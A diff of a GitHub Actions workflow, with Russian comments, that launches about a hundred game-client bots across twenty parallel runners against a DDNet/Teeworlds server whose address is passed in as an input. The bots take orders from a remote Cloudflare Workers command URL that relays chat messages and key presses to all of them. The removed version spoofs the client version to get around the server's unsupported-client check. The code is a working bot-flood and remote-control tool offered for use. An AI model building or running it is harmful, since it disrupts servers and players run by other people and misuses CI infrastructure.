@@ -13,108 +13,75 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # 20 машин по 5 ботов = 100 ботов
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     runs-on: ubuntu-latest
     
     steps:
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-          
-      - name: Install Library
-        run: npm install teeworlds
+      - name: Install Base Deps
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y xvfb xdotool libsdl2-2.0-0 libcurl4 jq
       
-      - name: Spawn & Spoof
+      - name: Download DDNet Binary Only (Super Fast)
+        run: |
+          # Качаем архив и вытаскиваем ТОЛЬКО файл DDNet (он весит мало)
+          curl -L -o ddnet.tar.xz https://ddnet.org/downloads/DDNet-18.3.1-linux_x86_64.tar.xz
+          tar -xvf ddnet.tar.xz --wildcards '*/DDNet' --strip-components=1
+          chmod +x DDNet
+
+      - name: Spawn Army (Instantly)
         env:
           CONTROL_URL: "https://lively-king-450c.5yearsme5.workers.dev/"
           SERVER_ADDR: "${{ github.event.inputs.server_ip }}"
         run: |
-          cat << 'EOF' > bots.js
-          const teeworlds = require('teeworlds');
-
-          const SERVER_ADDR = process.env.SERVER_ADDR;
-          const [ip, port] = SERVER_ADDR.split(':');
-          const CONTROL_URL = process.env.CONTROL_URL;
-
-          const NAMES = ["Sanya", "Maks", "Pavel", "Dimon", "Killer", "Legend", "ProPlayer", "Tee", "Sonic", "Apple", "Zora", "Panda"];
-          const bots = [];
-
-          async function start() {
-              for (let i = 0; i < 5; i++) {
-                  const name = `${NAMES[Math.floor(Math.random() * NAMES.length)]}_${Math.floor(Math.random() * 999)}`;
-                  
-                  // СОЗДАЕМ КЛИЕНТА
-                  const client = new teeworlds.Client(ip, parseInt(port), name, {
-                      // ЭТО САМЫЙ ВАЖНЫЙ МОМЕНТ ДЛЯ ОБХОДА "unsupported client"
-                      // Мы подменяем версию на ту, которую ждет DDNet (0.6 + специальный хэш)
-                      version: "0.6 626fce9a778df4d0", 
-                  });
-
-                  // Ручной патч версии внутри объекта (спуфинг под 18.3.1)
-                  client.version = "0.6 626fce9a778df4d0";
-                  
-                  client.connect();
-
-                  client.on('connected', () => {
-                      console.log(`[+] ${name} зашел как DDNet 18.x`);
-                      // Заходим в игру
-                      if(client.game) client.game.SetTeam(0);
-                  });
-
-                  client.on('disconnect', (reason) => {
-                      console.log(`[-] ${name} кикнут: ${reason}`);
-                  });
-
-                  bots.push(client);
-                  // Почти нет задержки (100мс чисто для стабильности сокета)
-                  await new Promise(r => setTimeout(r, 100));
-              }
-              poll();
-          }
-
-          let lastId = "0";
-          async function poll() {
-              while (true) {
-                  try {
-                      const res = await fetch(CONTROL_URL);
-                      const data = await res.json();
-                      if (data.id && data.id !== lastId) {
-                          lastId = data.id;
-                          console.log(`Команда: ${data.type}(${data.value})`);
-                          
-                          bots.forEach(bot => {
-                              if (!bot.game) return;
-                              if (data.type === 'chat') bot.game.Say(data.value);
-                              if (data.type === 'key') {
-                                  const k = String(data.value).toLowerCase();
-                                  // Мгновенное управление через библиотеку
-                                  if (k === 'a' || k === 'left') bot.movement.RunLeft();
-                                  if (k === 'd' || k === 'right') bot.movement.RunRight();
-                                  if (k === 's' || k === 'stop') bot.movement.RunStop();
-                                  if (k === 'w' || k === 'jump') {
-                                      bot.movement.Jump();
-                                      setTimeout(() => bot.movement.Jump(false), 150);
-                                  }
-                                  if (k === 'fire') {
-                                      bot.movement.Fire();
-                                      setTimeout(() => bot.movement.Fire(false), 150);
-                                  }
-                                  if (k === 'hook') {
-                                      bot.movement.Hook();
-                                      setTimeout(() => bot.movement.Hook(false), 500);
-                                  }
-                              }
-                          });
-                      }
-                  } catch (e) {}
-                  await new Promise(r => setTimeout(r, 2000));
-              }
-          }
-
-          start();
-          EOF
+          # Запуск "невидимого" экрана
+          export DISPLAY=:99
+          Xvfb :99 -screen 0 100x100x8 +extension GLX +render -noreset &
+          export LIBGL_ALWAYS_SOFTWARE=1
           
-          node bots.js
+          # Названия
+          NAMES=("Sanya" "Maks" "Pavel" "Dimon" "Killer" "Legend" "ProPlayer" "Tee" "Sonic" "Apple")
+
+          # Запуск 5 ботов мгновенно
+          for i in {1..5}; do
+            NAME="${NAMES[$RANDOM % ${#NAMES[@]}]}_$((RANDOM % 999))"
+            
+            # Создаем конфиг (авто-вход включен)
+            echo "player_name \"$NAME\"; cl_auto_join_team 1; connect \"$SERVER_ADDR\"" > "b$i.cfg"
+            
+            # Запускаем бинарник с конфигом
+            ./DDNet -f "b$i.cfg" > /dev/null 2>&1 &
+            echo "[+] Бот $NAME запущен"
+          done
+
+          echo "Все боты в сети. Слушаю команды..."
+          
+          LAST_ID="0"
+          while true; do
+            # Опрос команд (раз в 2 секунды для скорости)
+            CMD_JSON=$(curl -s --max-time 2 "$CONTROL_URL" || echo '{"id":"0"}')
+            ID=$(echo "$CMD_JSON" | jq -r '.id // "0"')
+            
+            if [ "$ID" != "$LAST_ID" ] && [ "$ID" != "0" ]; then
+              LAST_ID=$ID
+              TYPE=$(echo "$CMD_JSON" | jq -r '.type')
+              VAL=$(echo "$CMD_JSON" | jq -r '.value')
+              
+              echo "Команда: $TYPE($VAL)"
+              
+              # Ищем все окна DDNet
+              WIDS=$(xdotool search --class "DDNet")
+              for WID in $WIDS; do
+                if [ "$TYPE" == "chat" ]; then
+                  xdotool key --window $WID t
+                  sleep 0.05
+                  xdotool type --window $WID "$VAL"
+                  xdotool key --window $WID Return
+                elif [ "$TYPE" == "key" ]; then
+                  xdotool key --window $WID "$VAL"
+                fi
+              done
+            fi
+            sleep 2
+          done
